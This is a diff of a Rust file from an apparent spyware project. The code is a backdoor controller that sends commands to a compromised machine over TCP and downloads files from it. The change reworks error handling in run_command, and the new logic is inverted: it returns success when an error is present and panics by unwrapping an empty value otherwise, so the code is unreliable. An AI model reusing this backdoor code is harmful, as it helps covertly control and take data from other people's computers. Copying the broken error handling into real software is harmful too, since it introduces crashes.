@@ -1,7 +1,5 @@
 use serde::Serialize;
-use spyware::communication::messages::{
-    DownloadFileResponse, MessageType, MessageTypes, RunCommandRequest, RunCommandResponse,
-};
+use spyware::communication::messages::{DownloadFileResponse, MessageType, MessageTypes, RunCommandRequest, RunCommandResponse, ErrorInfo};
 use std::io::{Error, Write};
 use std::net::TcpStream;
 
@@ -20,7 +18,7 @@ fn send_request(req: impl Serialize + MessageType, stream: &mut TcpStream) -> Re
     Ok(())
 }
 
-pub fn run_command(command: String, mut stream: &mut TcpStream) -> Result<RunCommandResponse, Error> {
+pub fn run_command(command: String, mut stream: &mut TcpStream) -> Result<RunCommandResponse, ErrorInfo> {
     println!("Running command {} through backdoor.", command);
     let req = RunCommandRequest {
         command,
@@ -41,7 +39,11 @@ pub fn run_command(command: String, mut stream: &mut TcpStream) -> Result<RunCom
     println!("Output: {:?} ", &response.output);
     println!("Error info: {:?}", response.error_info);
 
-    Ok(response)
+    if response.error_info.is_some() {
+        Ok(response)
+    } else {
+        Err(response.error_info.unwrap())
+    }
 }
 
 pub fn download_file(remote_path: String, _local_path: String, mut stream: &mut TcpStream) {
